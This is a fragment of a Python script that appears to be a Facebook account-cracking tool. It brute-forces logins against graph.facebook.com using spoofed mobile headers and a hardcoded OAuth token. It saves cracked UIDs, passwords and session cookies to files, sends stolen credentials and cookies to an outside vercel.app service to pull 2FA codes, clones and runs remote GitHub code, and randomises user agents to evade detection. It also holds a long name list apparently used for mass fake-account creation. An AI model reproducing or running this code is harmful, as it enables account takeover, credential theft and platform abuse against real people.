			headers = {'User-Agent': ua,'Accept-Encoding': 'gzip, deflate','Connection': 'Keep-Alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger',	'X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
			url = 'https://b-graph.facebook.com/auth/login'
			
			po = requests.post(url, data=data, headers=headers).text
			po = json.loads(po)
			if 'your account was locked' in po:
				pass
			elif 'session_key' in po:
				try:
					uid = po['uid']
				except:
					uid = ids
			
				if str(uid) in oks:
					break
				else:
					oks.append(str(uid))
					print('\r\r\033[1;32m [LEGEND-USMII-OK] '+str(uid)+' | '+pas+'\033[1;97m')
					coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
					print("\r\r\033[1;33m KARAN "+coki)
					open('/sdcard/usmii-KARAN.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
					open('/sdcard/KARAN-OK.txt','a').write(str(uid)+'|'+pas+'\n')
					break
			elif 'www.facebook.com' in po['error']['message']:
				try:
					uid = po['error']['error_data']['uid']
				except:
					uid = ids
				
				if uid in oks:
					pass
				else:
					cps.append(str(ids))
					open('/sdcard/KARAN -rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
					break
			else:
				continue
		loop += 1
	except requests.exceptions.ConnectionError:
		#print("Internet Connection Error\nSleeping for 60s")
		time.sleep(60)
		#pass
	except Exception as e:
		#print(e)
		time.sleep(20)
		#pass

#-> Two Factor <-#
def Auto2F():
	own="hannan"
	clear()
	id, ps, cookie = input("\033[1;97m [✓] UID|PASS|COOKIE : ").split("|")
	linex()
	data = {"email": id,"password": ps,"cookie": cookie} 
	
	response = farhan_request("https://"+own+"-2f.vercel.app/2factor", "POST", data=data)
	response = json.loads(response)
	if response['Status'] == "Success":
		codes = response['2FCODES']
		keys = response['2FKEY']
		print("\033[1;92m [✓] \033[1;97mSuccess")
		linex()
		print("\033[1;92m [✓] \033[1;97m"+id)
		print("\033[1;92m [✓] \033[1;97m"+ps)
		linex()
		print("\033[1;92m [✓] \033[1;97m"+keys)
		linex()
		for i in codes:
			print("\033[1;92m [✓] \033[1;97m\t"+i)
			open('/sdcard/USMI-2F.txt','a').write(id+'|'+ps+'\n'+keys+'\n'+i+'\n')
	elif response['Status'] == "Error":
		print("\033[1;91m [×] \033[1;97mFailed")
		linex()
		print("\033[1;91m [×] \033[1;97m"+id)
		print("\033[1;91m [×] \033[1;97m"+ps)
		linex()
		print("\033[1;91m [×] \033[1;97m"+response["error_message"])
		linex()
	
	input(" PRESS ENTER TO BACK ")
	menu()

#-> File Create <-#
def create():
	os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
	os.system('cd && cd FILE ;python FILE.py')
#auto create user agent
def random_ua():
    model = "iPhone"+str(random.randint(4,16))+','+str(random.randint(1,9))
    abc = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','X','Y','Z']
    build = str(random.randint(9,19))+random.choice(abc)+str(random.randint(50,199))
    fbsv = str(random.randint(4,16))+'_'+str(random.randint(1,9))+'_'+str(random.randint(1,9))
    ua1 = 'Mozilla/5.0 (iPhone, CPU iPhone '+fbsv+' like Mac OS '+str(random.randint(8,16))+') AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/'+build+') Safari/604.1'
    ua2 = "Mozilla/5.0 (iPhone "+str(random.randrange(4,6))+" X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/"+str(random.randint(4,13))+".1.1 Mobile/"+model+" Safari/604.1"
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    ua3 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4,13))}; "+dv_typ+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])
    bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua4 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua5 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    a = random.randrange(112,115)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)
    dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160'])
    bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])
    dv_ver = random.randrange(100000,250000)
    sd_ver = random.randrange(1,10)
    ch_ver = f'{a}.0.{b}.{c}'
    ua6 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    ua = random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
    return(ua)
#-> Auto Create <-#
def Crreate():
    clear()
    import requests as r,re,random,os
    from bs4 import BeautifulSoup
    print()
    def rnd(a,b):
      return str(random.randint(a,b))
    
    def find(txtt,wrd):
       xx = re.findall('name="'+wrd+'" value="(.*?)"',txtt.replace("amp;",""))[0]
       return xx
    m=['Aijaz|Ali', 'Zulfiqar|Ali', 'Kamran|Wassan', 'Shoaib|Shoaib', 'Muhbbat|Wassan', 'Rana|Waseem', 'Paras|Paras', 'Rana|Mohsin', 'Aliali|Aliali', 'Ali|Ali', 'Ghulam|Ghulam', 'Waqar|Lakho', 'Junaid|Chandia', 'Asif|Jan', 'Ali|Gulam', 'Malik|Saab', 'Rana|Zakir', 'Zameer|Ali', 'Irshad|Jan', 'Gulam|Shabir', 'Tariq|Rajput', 'Sajid|Ali', 'Shamshad|Ali', 'Mola|Bux', 'Awais|Rao', 'Shahbaz|Ali', 'Rana|Sahil', 'Khadam|Faqir', 'Mukhtiar|Magsi', 'Ghulam|Ali', 'Shah|Mohammed', 'Rawal|Ali', 'ستار|دادا', 'Abdul|Majeed', 'Mer|Muhammad', 'Ali|Rajput', 'Rana|Farman', 'Ahtisham|Rajput', 'Alideno|Khoso', 'Own|Rana', 'Suhail|Ahmed', 'Gulzar|Ahmed', 'Ahamd|Jam', 'Tasawar|Rajput', 'Fida|Qureshi', 'Shamshad|Rahu', 'سوشل|ميڍيا', 'Sheeraz|Abbasi', 'Bashir|Ustad', 'Zubair|Rao', 'Zafar|Ali', 'Yaqoob|Ali', 'M|Soomar', 'Altaf|Hussain', 'Bahadur|Ali', 'Farman|Ali', 'Waris|Ali', 'Rana|Qurban', 'Muhammad|Khan', 'Asad|Asad', 'Sartaaj|Sartaaj', 'Rana|Kabir', 'Rana|Abdul', 'Ghulam|Hussain', 'Kirshan|Kumar', 'Adil|Rajpoot', 'Sahoowal|Sahoowal', 'عبد|الجبار', 'Imran|Ali', 'Faz|Mahammad', 'Safeel|Nawaz', 'ريا|ض', 'Haroon|Rana', 'Amjad|Ali', 'Kashii|Rajpoot', 'Junejo|Sahib', 'Altaf|Pahore', 'Ali|Rajput', 'Zeeshan|Ali', 'Muhammad|Muktiar', 'Iftikhar|Ahmand', 'Shahzeb|Ali', 'Faiz|Jutt', 'Chanesar|Khan', 'Ali|Shar', 'Zuhair|Ahmed', 'محب|علی', 'Siraj|Khaskheli', 'Rana|Dilshad', 'Ghazanfar|Ali', 'Rao|Awais', 'Jaan|Jaan', 'Syed|Junaid', 'Abdul|Ghaffar', 'Kirshan|Kumar', 'ابومحمد|احمد', 'Nisar|Hussain', 'Nasir|Dahri', 'Hakim|Khan', 'Ahsan|Raza', 'Nadir|Rind', 'Sålmàñ|Çh', 'GhulamNabi|Khaskhali', 'Umar|Lal', 'NabeelHy|Ka', 'Dilshad|Magsi', 'Haaji|Anwar', 'Nisar|Ahmed', 'Barkat|Ali', 'Irfan|Ali', 'Aslam|Khan', 'Hashim|Khoso', 'Abdul|Malik', 'Masroor|Zardari', 'Rao|Bilal', 'Nisarkhoso|Nisarkhoso', 'مرجع|الناطق', 'Sajawal|Rajput', 'Rana|Muhammad', 'Rana|Dilshad', 'Rana|Imran', 'Daniyal|Kazmi', 'Faqeer|Baboo', 'Azan|Jan', 'Gul|Hassan', 'Nadir|Jan', 'NadeemRind|Rind', 'Angel|Rodriguez', 'Allahbux|Rang', 'Ghullam|Muhammad', 'Talib|Hussain', 'Abid|Ali', 'Rana|Noushad', 'Ghulam|Hussain', 'Samir|Samir', 'Shahid|Rana', 'Janib|Janib', 'Maria|Albuquerque', 'Rana|Qasim', 'Faizan|Ali', 'Ali|Gul', 'Madeji|Power', 'Rajput|Faisal', 'Mansoor|Sahito', 'Ali|Dero', 'Razaq|Khaskheli', 'Muneer|Ali', 'Imran|Ali', 'Sakhawat|Ali', 'Khadim|Baloch', 'Rana|Taswar', 'Raouf|Chadhar', 'Umar|Shahzad', 'Shah|Mir', 'Irfsn|Irfsn', 'Abbas|King', 'Aftab|Ali', 'M|Raju', 'Ghulam|Mustafa', 'Gul|Sher', 'Nazim|Hussain', 'Malik|Jawed', 'Deedar|Hussain', 'Maham|Khan', 'Junaid|Rajput', 'Sawan|Ali', 'Sajwal|Rao', 'Ayaz|Ali', 'Irfan|Irfan', 'Hut|Khan', 'Ana|Mendez', 'Shakeel|Khosa', 'Javed|Javed', 'Dil|E', 'Rana|Adil', 'Rahil|Ali', 'Innayat|Ali', 'Aijaz|Abbasi', 'Jamil|Jan', 'Fidah|Khoso', 'Rana|Abdul', 'Rana|Junaid', 'Malik|Sajid', 'Ghulam|Ali', 'Ahsan|Ali', 'Imtiaz|Ali', 'Islam|Baloch', 'Hashim|Khoso', 'Sattar|Buledi', 'Nanik|Ram', 'Gul|Wali', 'Rahman|Khan', 'Ali|Hassan', 'Sooraj|Kumar', 'GhulamAbbas|Channa', 'Muhammad|Saleh', 'Ali|Ali', 'Ayazaliayaz|Ayazaliayaz', 'Asif|Baloch', 'Mujeeb|Bds', 'Rana|Mustak', 'Ali|Rind', 'Amjad|Ali', 'سلامدين|سلامدين', 'Himat|Ali', 'Amanullah|Abro', 'Shookat|Ali', 'Mushoque|Malokhani', 'Zulifqar|Ali', 'Fareed|Abro', 'Zuhaib|Ali', 'Rasmyh|Rasmyh', 'Zubair|Ali', 'Waheed|Ali', 'Mohsin|Shaikh', 'Muzamil|Rajput', 'Gul|Bahar', 'Zaffar|Khoso', 'Akram|Ali', 'Rana|Sajids', 'Noor|Highlights', 'Basher|Baloch', 'Musam|Aill', 'Jamshed|Rana', 'علی|مولا', 'Hero|G', 'Rematullha|Rajpoot', 'Ustad|Hanif', 'Zubair|Ali', 'Rana|Abdul', 'Kamran|Ali', 'Kosar|Vighamal', 'Mansoor|Ali', 'Nadeem|Raza', 'Niaz|Hussan', 'Awais|Malik', 'Ammar|Shoz', 'Atta|Mohmad', 'Naeem|Khan', 'Sanju|Bhai', 'Waseem|Abass', 'Ghulam|M', 'Muhammad|Urs', 'Zahid|Hussain', 'Rana|Rajput', 'Meer|Jan', 'Waris|Ali', 'Inayat|Np', 'Sher|Muhhammd', 'Rana|Muzfar', 'Beni|Solis', 'Suba|Ali', 'Umesh|Kumar', 'Basit|Kahout', 'Rafiq|Khaskali', 'Saira|Khan', 'Rizwan|Ali', 'Shahbaz|Ali', 'Ail|Aagsr', 'M|Rafiq', 'Alom|Alahaj', 'Muhmmad|Waris', 'Sameer|Ali', 'Rana|Qaser', 'Fkgkodfj|Xkxnxuc', 'Saijad|Ali', 'Nadeem|Jan', 'Ajkhoso|Ajkhoso', 'Huzaifa|Ansari', 'Mazhar|Abbas', 'Molaa|Bux', 'Mashuq|Ali', 'Aneel|Kumar', 'Zahid|Hussain', 'Alihyder|Kalhoro', 'Rana|Rana', 'Bashir|Ahmed', 'Khalid|Hussein', 'Mumtaz|Ali', 'Arif|Memon', 'Ayoub|Baloch', 'Tehmoor|Ali', 'Imran|Ali', 'Shamshad|Ali', 'Ghulam|Hussain', 'Sajjad|Panhwar', 'Mole|Deno', 'Farooq|Bhaijan', 'Israr|Jakhrani', 'Imtyaz|Ali', 'Adeel|Masih', 'Gull|Hassan', 'Tando|Adam', 'منظور|راهو', 'Rana|Rehman', 'Mamtaz|Sehto', 'Amjid|Ali', 'Rana|Mubashir', 'Hamidullah|Mangsi', 'Ghulam|Nabi', 'Ahmed|Ali', 'Syedjaved|Shah', 'Rao|Hassan', 'Papoo|Kumar', 'Mehtab|Ali', 'Rana|Kashif', 'Rana|Wnus', 'Farman|Ali', 'Zulifiqar|Zulifqar', 'Sadam|Chandio', 'Mitho|Mallah', 'کاشف|راجپوت', 'Shamshaad|Rahoo', 'Hajan|Abbasi', 'Muneer|Zaib', 'Ayaz|Ayaz', 'Zain|Ali', 'Ghulam|Muhammad', 'Rao|Bilal', 'Babu|Khan', 'Rana|Ikram', 'Rana|Nasir', 'Amen|Rajpot', 'Fardeen|Panhwar', 'نگاھ|حبيب', 'Nadeem|Ali', 'Najaf|Ali', 'عمران|عباسی', 'Sahil|Shah', 'Ali|Hassan', 'Sonu|Jani', 'Ajmal|Abbasi', 'Abn|Rajab', 'Imtiyaz|Yousufzai', 'Dildar|Ali', 'Adil|Rao', 'Badshah|Yt', 'Sawan|Ali', 'Ali|Ahmed', 'Amir|Ali', 'Amjad|Ali', 'Shahid|Khan', 'Siama|Khan', 'Gulam|Shabir', 'Tehmoor|Hassan', 'Ghulam|Ali', 'Masum|Ali', 'Dedar|Ali', 'Shani|Jutt', 'Rintu|Kumar', 'Sikandar|Shah', 'Furqan|Jutt', 'Rahil|Ali', 'Rana|Shehzad', 'Nisha|Kumari', 'Jamshed|Khan', 'Zawar|Safdar', 'Murtaza|Ali', 'Muhammad|Aijaz', 'Punhal|Ali', 'Bisharat|Mirbahar', 'Xtylíśh|Shahmir', 'نصيراحمد|ميمڻ', 'Darya|Khan', 'Imdad|Khoso', 'Allyas|Allyas', 'Amjad|Ali', 'Bhatti|G', 'Faizan|Aziz', 'Rashad|Baloch', 'Abdul|Jabar', 'Rana|Shafiq', 'Hamadullah|Lakho', 'Ziafat|Khan', 'Faqeer|N', 'Rana|Ibrar', 'Shafi|Muhmmad', 'Awees|Ali', 'Amir|Ali', 'Ali|Khan', 'QaMar|ZaMan', 'Rana|Naveed', 'فرینا|فرینا', 'Ghul|Sher', 'Safeer|Khaskhali', 'Rana|Asim', 'Farhan|Ali', 'Ghulam|Abbas', 'Zulfiqar|Ali', 'Zakir|Ali', 'Rhman|Ali', 'Rana|Ali', 'Muneer|Khan', 'Mumtaz|Ali', 'Nadeem|Ali', 'Zameer|Shah', 'Faheem|Ahmad', 'Pordip|Mandal', 'Shahzaib|Rahman', 'Zidi|Bacha', 'Waqar|Rajput', 'Ali|Akbar', 'Ali|Raza', 'Sabir|Ali', 'Rana|Qurban', 'Ali|Bahte', 'Sajad|Ali', 'Ahadattaullah|Malik', 'Muzammil|Hussain', 'Jan|Muhammad', 'Fasial|S', 'Ameer|NaNa', 'Makro|Sharif', 'Mithal|Khaskheli', 'محمدموسا|محمدموسا', 'Mitho|Mallah', 'Muzzamil|Ali', 'Ahmad|Hassan', 'Babar|Babar', 'Zawar|Muhammad', 'Rana|Nadir', 'Mazhar|Ali', 'Rana|Irfan', 'Bilal|Abbasi', 'Ghulam|Jaffar', 'Asif|Rana', 'Mœhäməd|Řhæ', 'M|Nawaz', 'Farooq|Ali', 'Ashfaq|Rahoo', 'Azmat|Ali', 'Mateen|Rana', 'Shan|Ali', 'Çhårîyē|Çhøkrī', 'Parwez|Ali', 'Azhar|Hussain', 'Shahabaz|Ali', 'Syed|Ghot', 'Zahid|Hussain', 'Mir|Babu', 'Zarik|M', 'Shakel|Ansari', 'Hafiz|Imran', 'Shah|Zaib', 'Bilal|Jan', 'Asif|Asif', 'Asif|Asif', 'Muzafar|Rajbut', 'Makhdoom|Ghulam', 'Rana|Farooq', 'Gulam|Yaseen', 'Ashiqe|Jatt', 'Arshad|Brohi', 'Nazeer|Ahmed', 'Sajad|Ali', 'Mircho|Mal', 'Rana|Junaid', 'Lakho|Mal', 'Sajid|Ali', 'Raees|Rahat', 'Irfan|Ali', 'Rana|Imran', 'Ali|Mughal', 'Riaz|Khan', 'Ahsan|Bozdar', 'Shahidalisolangi|Shahidalisolangi', 'Tariq|Tariq', 'Rao|Nasir', 'Zahid|Ali', 'Shahzad|Madni', 'Sarfaraz|Rahu', 'Mubashair|Rana', 'Ahsan|Khoso', 'Jalger|Bhatti', 'Rana|Wajid', 'Lala|Aziz', 'Shakir|Abbasi', 'Ali|Asgar', 'Ruble|Hasan', 'Abdul|Rehman', 'Azizullah|Soomro', 'Abbas|Ali', 'Muhammad|Ali', 'Rana|Wajid', 'Rana|Musharaf', 'Rashid|Qureshi', 'Shahmeer|Chandio', 'Shan|Ali', 'Ahmed|Qureshi', 'Zaheer|Abbas', 'Imran|Ali', 'Asif|Khan', 'Shahid|Ali', 'Mangii|Mangii', 'Momin|Ali', 'Meer|Shan', 'Muqu|Poiro', 'Umar|Shahzad', 'Waris|Ali', 'Numwar|Ali', 'Muhammad|Tahir', 'AKhtar|Ali', 'Rana|Sajid', 'Sarfarazmemon|Attad', 'Salim|Junejo', 'Mashque|Ali', 'Hassnan|Ali', 'Irfan|Ali', 'Adv|Ali', 'Himmat|Ali', 'Khalid|Jamil', 'Mohsin|Rajput', 'Syed|Nadir', 'Raheem|Punho', 'Rana|Abdullah', 'Rana|Noaman', 'Mansoor|Solangi', 'Imran|Jaan', 'Waris|Ali', 'Rana|Mubasher', 'Mujahid|Ali', 'Hussnain|Rajpoot', 'Chaudhary|Abdul', 'Haider|Baloch', 'Ali|Dino', 'Mir|Khan', 'Irfan|Fatima', 'Arshad|Baloch', 'Shakir|Abbasi', 'Naveed|Rind', 'Gul|Muhammad', 'Meer|Murtaza', 'Papo|Papo', 'Nisar|Ali', 'Gbhs|Bhit', 'Sadoro|Jan', 'Rana|Moon', 'Ramzan|Jan', 'Rana|Zakir', 'Rao|Waqas', 'M|Waqas', 'Rana|Rana', 'Rukhsar|Haidry', 'RaNa|BOby', 'M|Juman', 'Sadiq|Ali', 'Manik|Khan', 'Ran|A', 'Ghulab|Hussain', 'Ronaq|Ali', 'Tarique|Ali', 'Abdul|Qadir', 'Zawar|Sohana', 'Mehran|Rajput', 'Sikandar|Ali', 'Ãtîf|Â', 'Meer|Shahzeb', 'Sajjad|Abbasi', 'Rana|Naeem', 'Bashir|Ahmed', 'Rafeh|Rajpoot', 'ẞk|KhÄñ', 'Imtiaz|Khoso', 'Alex|Shahzad', 'Aman|Abbasi', 'Mehran|Rajput', 'Raja|Rajpot', 'Bahdur|Ali', 'Hammad|Ali', 'Salman|Salman', 'Shahzad|Shahzad', 'AtaullAh|Khan', 'Rafique|Mirani', 'Arbab|Ali', 'Nisar|Ali', 'Zahid|Hussain', 'Rana|Shahzad', 'Rana|Ramzan', 'Noro|Mohmad', 'Riaz|Rajput', 'Mahbat|Khan', 'Ahsan|Ali', 'Rana|Ikram', 'Qamar|Abbas', 'Jahanzib|Ali', 'Rana|Sunny', 'Rao|Yasir', 'Muhammad|Mithal', 'Ashiq|Hussain', 'Ha|Ni', 'Abdul|Latif', 'Meer|Mortaz', 'Meer|Zohaib', 'Zahid|Bhatti', 'Awais|Rajput', 'Ali|Bux', 'Abdul|Hakeem', 'Hassnain|Muavia', 'Syed|Junaid', 'Riaz|Machi', 'Ahsan|Abro', 'Hyder|Ali', 'Sattar|Sattar', 'Sayed|Sharafat', 'Syed|Bilalarif', 'Lal|Muhmmad', 'Mohsin|Ali', 'Asif|Ali', 'Juleed|Shah', 'Hayat|Khan', 'Ali|Bux', 'पवन|अल्लापुर', 'Ghulam|Nabi', 'Zaheer|Ali', 'Soomar|Bughio', 'Madad|Ali', 'Naeem|Chohan', 'Javed|Javed', 'Waseem|Raza', 'Saorg|Khan', 'Zeeshan|Zeeshan', 'Aliza|Chaudhary', 'Rana|Shuaib', 'Ali|Khan', 'Rao|Shabbir', 'Commandos|King', 'Arshad|Sli', 'Rana|Shahrukh', 'Ratan|Kumar', 'Umar|Khan', 'Ali|Bhnoo', 'Shahzaib|Shah', 'Aqib|Gakhar', 'Rana|Ishaq', 'Bilal|Rajput', 'Asif|Khan', 'Hazrat|Hussain', 'Zohair|Ali', 'Parvez|Ali', 'Altaf|Hussain', 'Mashooq|Ali', 'Dilshad|Magsi', 'Gulam|Mustafa', 'Safdiar|Khan', 'Tofiq|Khan', 'Sudheer|Ahmad', 'Suhrab|Pardesi', 'Syed|Badshah', 'Ashok|Kumar', 'Ssbri|Chandio', 'Yaseen|Ali', 'Rimsha|Shehzadi', 'Meer|Aamir', 'Lakhiar|Adeel', 'Ariz|Muhammad', 'عبداللہ|کوھارو', 'Yameen|Ali', 'Sahil|Gadehi', 'Sahab|Ali', 'Naimatullah|Ali', 'Baqir|Sajjad', 'مير|حارث', 'M|Slutan', 'Sadaqat|Ali', 'Fahad|Ali', 'Muhammed|Shabeer', 'Khalifo|Chandio', 'Zohaib|Ali', 'Ab|Ghani', 'Ibrahim|Baloch', 'Rehmatullah|Mastoi', 'Mohammed|Younis', 'Shahzadi|Kiran', 'Ahmad|Khan', 'Arshad|SooMro', 'Sadam|Solangi', 'Yamen|Ali', 'Majid|Khan', 'Ab|Aziz', 'Sabir|Khuharo', 'Nazeer|Chandio', 'Md|Samer', 'Kaif|Qureshi', 'MuHammad|HaaDi', 'Altaf|Khan', 'Majid|Ali', 'Muhammad|Abraim', 'Noor|Ahmed', 'Abid|Hussain', 'Ashraf|Buriro', 'Rajib|Ali', 'Ahsan|Ali', 'Aakash|Khuharo', 'Hassan|Ali', 'Awaiz|Memon', 'Asharf|Malah', 'Muslim|Chandio', 'Haji|Saddam', 'Rashid|Ali', 'Assadullah|Kolachi', 'Kashif|Ali', 'Irfan|Ali', 'Zulfqar|Soomro', 'Ghafar|Chandio', 'Younis|Ali', 'Meer|Murtiza', 'Majahd|Ali', 'Rao|Arslan', 'Rana|Tsawar', 'Akbar|Rajput', 'Rana|Yasir', 'Rana|Waqar', 'Rana|Umer', 'Rao|Zeeshan', 'Rana|Aqib', 'Rana|Mudassar', 'Rana|Zubair', 'Rana|Zohaib', 'Rana|Rana', 'Rao|Shoaib', 'Nokhaiz|Rao', 'Rana|G', 'Saeed|Somro', 'Rana|Muklish', 'Muzamil|Rajput', 'Râõ|Zêshãñ', 'Rana|Nasrullah', 'Rana|Naveed', 'Hamza|Rajpoot', 'Rana|Naveed', 'Rana|Zahid', 'Rao|Ali', 'Rao|Ishfaq', 'Ehsan|Rana', 'Ahsan|Rana', 'Mohammed|Akmal', 'Rana|Naeem', 'Rana|Ahmad', 'Rana|Shani', 'Rao|Nasir', 'Rao|M', 'Rana|Imran', 'Rao|Arshad', 'Rao|Sanaullah', 'Ali|Rana', 'Rao|Muhammad', 'Rana|Gulraiz', 'Salal|Rajput', 'Rana|Muhammad', 'Ijaz|Rajpoot', 'M|Farman', 'Rao|Raees', 'Rana|Umar', 'Umair|Rana', 'Shafiq|Rajpoot', 'Rana|Numan', 'Rao|Shb', 'Rana|Yousif', 'Rana|Liaqat', 'Rana|Asad', 'Zafar|Rajpoot', 'Rao|Hamza', 'Abubakar|Rajput', 'Rao|M', 'Rana|Ishaq', 'Waqas|Rajpoot', 'Amir|Sohail', 'Rao|Sohaib', 'Rana|Shazil', 'Rao|Bilal', 'Rao|Altaf', 'Rao|Nabeel', 'Hamza|Rao', 'Asif|Rana', 'Rana|Umair', 'Raokashif|Ali', 'Rao|Qaiser', 'Rana|Attual', 'Rana|Shabaz', 'Rao|Salman', 'Rao|Samad', 'Rao|Shoaib', 'Rana|A', 'Rao|Kashif', 'Rao|Zarar', 'Rana|Tayyub', 'Raja|Kamal', 'Amir|Rajput', 'RaoAlizaman|RaoAlizaman', 'Hamza|Rao', 'Rana|Falak', 'Sikandar|Khan', 'Rao|Shahbaz', 'Rana|Talha', 'Kashif|Rajpoot', 'Hammad|Rana', 'Hamza|Rao', 'Roa|Zahid', 'Rana|Hamza', 'Rao|Saleem', 'Rao|Faryad', 'Rao|Abubakar', 'Bilal|Rajput', 'Rao|Waseem', 'Sonu|Rao', 'Rana|Rizwan', 'Bilal|Rao', 'Rans|Maqsood', 'Rana|Furqan', 'Rao|Ali', 'Rana|Muzamil', 'M|Asif', 'Rao|Sohail', 'Rana|Bahadur', 'Rana|Muhmmad', 'Shahzada|Gs', 'Rao|Farhan', 'Zahgim|Ali', 'Abaid|Raja', 'Rana|Waseem', 'Rana|Ajmal', 'Rao|Latif', 'Rao|Aqib', 'Rana|Ramzan', 'Wajid|Rana', 'Sabir|Rajpoot', 'Rana|Shehryar', 'Rana|Yaqub', 'Rao|Abdul', 'Rajput|Sab', 'Rana|Tasawar', 'Rana|Waseem', 'Rana|Babar', 'Rana|Shahid', 'Rana|Maviya', 'Rana|Saeed', 'Waheed|Rajput', 'Junaid|Rajpoot', 'Rao|Saqib', 'Rao|Azeem', 'Rana|Ali', 'Muhammad|Nadeem', 'Rana|Majid', 'Rana|Sahab', 'Abubakar|Jatoi', 'Sabir|Dogar', 'Ameen|Rana', 'Rana|Shakeel', 'Rao|Tasleem', 'Pʀɩŋcɘ|Nʌsɩʀ', 'Rana|Mani', 'Rana|Jee', 'Zidi|Rana', 'Rana|Kamran', 'Rana|Zabi', 'Mehtab|Rao', 'حسن|راو', 'Rana|Sajid', 'Rao|Aftab', 'Rana|Muhammad', 'Muhammad|Muhammad', 'Rao|Abdulrazaq', 'Rao|MubeenRao', 'Rao|Nazeer', 'Rana|Adnan', 'Rana|Alishan', 'Rana|Wahab', 'Rao|Ali', 'Rana|Rashid', 'Rana|Waqar', 'Dilawar|Rao', 'Rana|Iftkhar', 'Shami|Rana', 'Rana|Hamza', 'Rana|Luqman', 'Rao|Haseeb', 'Rana|Waseem', 'Rana|Abid', 'شہری|راجپوت', 'Rao|Mohammad', 'Rana|Rashid', 'Rana|Hamza', 'Tariq|Javid', 'Rao|Ahtsham', 'Rana|Tauqeer', 'Rao|Zeeshan', 'Ahad|Rajpoot', 'M|Muzamil', 'Rana|Zaid', 'Rana|Asad', 'Usama|Rana', 'Rana|Ali', 'Rana|Sajid', 'Rana|Tokeer', 'Rana|Mikro', 'Rana|Rana', 'Raza|Jafri', 'Rana|Kamran', 'Rao|Sharafat', 'Rana|Awais', 'Rana|Arslan', 'Rana|Qazafi', 'Rana|Waqar', 'Flk|Sher', 'Rana|Danish', 'Rana|Mudassar', 'Rana|Khalid', 'Rana|Nadeem', 'Adil|Rao', 'Rana|Tahseen', 'Rao|Tayyab', 'Rao|Waseem', 'Rana|Faheem', 'Rao|Khaleeq', 'Ali|Adnan', 'Rao|Ikhtiar', 'Rao|Jani', 'Rao|Amir', 'Farman|Rao', 'اشتہاری۔راجپوت|اشتھری۔راجپوت', 'RanaAli|Rana', 'Rao|Shoaib', 'Raozain|Raozain', 'Sajawal|Rajpoot', 'Rana|Tanveer', 'Rao|Aqib', 'Rana|Ehsan', 'Rao|Zubair', 'Rajpoot|Zeeshan', 'Ahsan|Rana', 'Rao|Saad', 'Safdar|Rana', 'Rana|Mubeen', 'Räñâ|Umäir', 'Rao|Jani', 'Rana|Ibrar', 'Rao|Amir', 'Rana|Asif', 'Hussnain|Qureshi', 'Abdullah|Somroo', 'Rana|Nabeel', 'Rana|Gulfam', 'Babar|Rao', 'Zubair|Rao', 'Abubakar|Rao', 'Rana|G', 'Rana|Shair', 'Rana|Haris', 'Rao|Tariq', 'Zain|Rao', 'Muhammad|Qadeer', 'Rao|Naveed', 'Rizwan|Rao', 'Sajid|Ali', 'Rao|Munir', 'Rana|Afaq', 'Rajput|Brand', 'Rao|Hassan', 'Rana|Saim', 'Mukhtiyar|Khan', 'Rana|Sarfraz', 'Rana|Naveed', 'Rana|Faizan', 'Usama|Rana', 'Muzammil|Rao', 'Rahman|Dogar', 'Rana|Danish', 'Rao|Shahryar', 'Rana|Shahzad', 'Naqeeb|Rao', 'Anss|Rana', 'Subhan|Rana', 'عبدالرحمان|راؤ', 'R|A', 